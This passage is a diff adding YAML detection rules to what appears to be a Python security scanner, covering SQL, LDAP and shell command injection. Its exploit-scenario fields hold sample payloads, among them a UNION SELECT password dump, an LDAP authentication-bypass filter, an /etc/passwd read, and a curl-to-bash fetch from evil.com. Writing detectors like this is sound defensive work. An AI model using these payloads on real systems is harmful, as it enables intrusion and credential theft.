+    - Use SQLAlchemy text().bindparams() for parameterized raw queries.
+
+    - Avoid .extra() entirely; use annotations and aggregations instead.
+
+    '
+  references:
+  - https://docs.djangoproject.com/en/4.2/topics/db/sql/#passing-parameters-into-raw
+  - https://cwe.mitre.org/data/definitions/89.html
+  context_awareness:
+    surrounding_context_patterns:
+    - from django.db import
+    - from sqlalchemy import text
+    taint_source_indicators:
+    - request.GET
+    - request.POST
+    - request.args
+    - request.form
+    taint_sink_indicators:
+    - .raw(
+    - .extra(
+    - text(
+    - session.execute(
+    sanitization_patterns:
+    - .raw(.*,.*[
+    - bindparams
+    - .objects.filter(
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Django view uses User.objects.raw(f"SELECT * FROM users WHERE name=''{name}''").
+
+      Attacker sends name="'' UNION SELECT password FROM users--" to dump passwords.
+
+      '
+    example_payload: ''' UNION SELECT username,password FROM auth_user--'
+    attacker_objective: Extract data via SQL injection through ORM raw query
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - PY-INJ-001
+    - PY-INJ-008
+- rule_id: PY-INJ-014
+  title: LDAP Injection via python-ldap
+  description: 'Detects LDAP injection where user-controlled input is interpolated into LDAP filter strings or DN values without
+    sanitization, enabling authentication bypass and directory enumeration.
+
+    '
+  language: python
+  category: injection
+  severity: High
+  confidence: 0.89
+  cwe: CWE-90
+  owasp: A03:2021-Injection
+  tags:
+  - ldap-injection
+  - python-ldap
+  - authentication-bypass
+  - directory
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: \.search_s\s*\([^,]+,\s*\w+\s*,\s*f['"][^'"]*\{[^}]*(?:request|param|input|user|username)\b
+    description: LDAP search with f-string filter containing user input
+  - type: regex
+    pattern: \.search_s\s*\([^,]+,\s*\w+\s*,\s*['"][^'"]*["']\s*%\s*(?:request|param|input|user|username)\b
+    description: LDAP search with % formatted filter
+  - type: regex
+    pattern: \.search_s\s*\([^,]+,\s*\w+\s*,\s*['"][^'"]*["']\s*\.format\s*\([^)]*(?:request|param|input|user|username)\b
+    description: LDAP search with .format() filter
+  - type: regex
+    pattern: ldap3\.(?:Connection|Server)\s*\([^)]*(?:request|param|input|user)\b
+    description: ldap3 connection with user-controlled parameters
+  anti_patterns:
+  - ldap\.filter\.escape_filter_chars
+  - escape_dn_chars
+  - sanitize
+  - allowlist
+  - test\s*\(
+  - ldap3\.utils\.dn\.escape
+  bypass_variants:
+  - description: LDAP wildcard injection
+    pattern: \*\)\(\|?\(\w+=\*
+  - description: LDAP OR operator injection
+    pattern: \)\(|\|\(\w+=\*\)
+  evasion_indicators:
+  - LDAP metacharacter injection (*, (), |, &)
+  - DN injection via unescaped commas
+  - Hex-encoded LDAP filter characters
+  encoding_variants:
+  - type: hex_ldap
+    pattern: \\[0-9a-fA-F]{2}
+  - type: unicode
+    pattern: \\u002a
+  multi_function_chain_patterns:
+  - request.form['username'] -> f"(uid={username})" -> search_s()
+  - request.json['user'] -> filter string -> ldap.search
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Authentication bypass and directory data exfiltration
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.form['username']
+    sink: ldap.search_s(filter)
+    through: f-string or % formatting
+  impact: 'LDAP injection allows authentication bypass, user enumeration, and
+
+    extraction of sensitive directory attributes (passwords, email, groups).
+
+    '
+  remediation: '- Use ldap.filter.escape_filter_chars() for filter values.
+
+    - Use ldap.dn.escape_dn_chars() for DN components.
+
+    - Validate input against strict character allowlists.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/90.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - import ldap
+    - from ldap3 import
+    - ldap.initialize
+    taint_source_indicators:
+    - request.form
+    - request.json
+    - request.args
+    taint_sink_indicators:
+    - .search_s(
+    - .search(
+    - ldap3.Connection
+    sanitization_patterns:
+    - escape_filter_chars
+    - escape_dn_chars
+    - allowlist
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A login uses ldap.search_s(base, scope, f"(&(uid={username})(userPassword={password}))").
+
+      Attacker sends username=*)(uid=*))(|(uid=* to bypass authentication.
+
+      '
+    example_payload: '*)(uid=*))(|(uid=*'
+    attacker_objective: Bypass LDAP authentication or enumerate directory entries
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PY-INJ-001
+    - PY-INJ-008
+- rule_id: PY-INJ-015
+  title: subprocess shell=True with User Arguments
+  description: 'Detects subprocess.run/call/Popen invocations with shell=True where command arguments are constructed from
+    user-controlled input, enabling shell metacharacter injection even when the base command is hardcoded.
+
+    '
+  language: python
+  category: injection
+  severity: High
+  confidence: 0.93
+  cwe: CWE-78
+  owasp: A03:2021-Injection
+  tags:
+  - command-injection
+  - subprocess
+  - shell-true
+  - rce
+  - python
+  detection_layer: 1
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: subprocess\.(?:run|call|Popen|check_output|check_call)\s*\(\s*f['"][^'"]*\{[^}]*(?:request|param|input|user|data|filename|path|host|url)\b[^)]*shell\s*=\s*True
+    description: subprocess with f-string args and shell=True
+  - type: regex
+    pattern: subprocess\.(?:run|call|Popen)\s*\(\s*['"][^'"]*["']\s*\+\s*(?:request|param|input|user|data|filename)[^)]*shell\s*=\s*True
+    description: subprocess with concatenated args and shell=True
+  - type: regex
+    pattern: subprocess\.(?:run|call|Popen)\s*\(\s*['"][^'"]*["']\s*%\s*(?:request|param|input|user|data)[^)]*shell\s*=\s*True
+    description: subprocess with % formatted args and shell=True
+  - type: regex
+    pattern: subprocess\.(?:run|call|Popen)\s*\(\s*(?:cmd|command|cmd_str)\b[^)]*shell\s*=\s*True
+    description: subprocess with variable command and shell=True
+  anti_patterns:
+  - shell\s*=\s*False
+  - subprocess\.run\s*\(\s*\[
+  - shlex\.quote
+  - shlex\.split
+  - '# nosec'
+  - test\s*\(
+  - ALLOWED_COMMANDS
+  bypass_variants:
+  - description: Shell metacharacter injection
+    pattern: ;[^;]*(?:cat|ls|wget|curl|nc|bash)\s+
+  - description: Backtick substitution
+    pattern: '`[^`]*(?:cat|ls|wget|curl|nc|bash)'
+  evasion_indicators:
+  - Shell metacharacter injection (; | & ` $())
+  - Backtick command substitution
+  - Newline injection in arguments
+  encoding_variants:
+  - type: url_encoding
+    pattern: '%3b.*%7c'
+  - type: hex
+    pattern: \\x3b.*\\x7c
+  multi_function_chain_patterns:
+  - request.form['host'] -> f"ping -c 4 {host}" -> subprocess.run(cmd, shell=True)
+  - request.args['file'] -> f"cat {file}" -> subprocess.check_output(cmd, shell=True)
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Arbitrary OS command execution via shell metacharacters
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.form, request.args
+    sink: subprocess.run(cmd, shell=True)
+    through: f-string or concatenation with user input
+  impact: 'Command injection via subprocess with shell=True enables arbitrary OS
+
+    command execution, full server compromise, and persistent backdoors.
+
+    '
+  remediation: '- Use subprocess.run(["cmd", "arg1", "arg2"]) with shell=False (default).
+
+    - Pass arguments as a list, never as a concatenated string.
+
+    - Use shlex.quote() if shell=True is unavoidable.
+
+    - Use shlex.split() to safely parse command strings.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://docs.python.org/3/library/subprocess.html#security-considerations
+  context_awareness:
+    surrounding_context_patterns:
+    - import subprocess
+    - from subprocess import
+    taint_source_indicators:
+    - request.form
+    - request.args
+    - request.json
+    - sys.argv
+    taint_sink_indicators:
+    - subprocess.run(
+    - subprocess.call(
+    - subprocess.Popen(
+    - subprocess.check_output(
+    sanitization_patterns:
+    - shlex.quote(
+    - shlex.split(
+    - shell=False
+    - ALLOWED_COMMANDS
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Flask app runs subprocess.run(f"nmap {request.form[''target'']}", shell=True).
+
+      Attacker sends target="127.0.0.1; cat /etc/passwd" to read system files.
+
+      '
+    example_payload: 127.0.0.1; curl http://evil.com/shell.sh | bash
+    attacker_objective: Execute arbitrary OS commands via subprocess shell injection
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PY-INJ-002
+    - PY-INJ-003
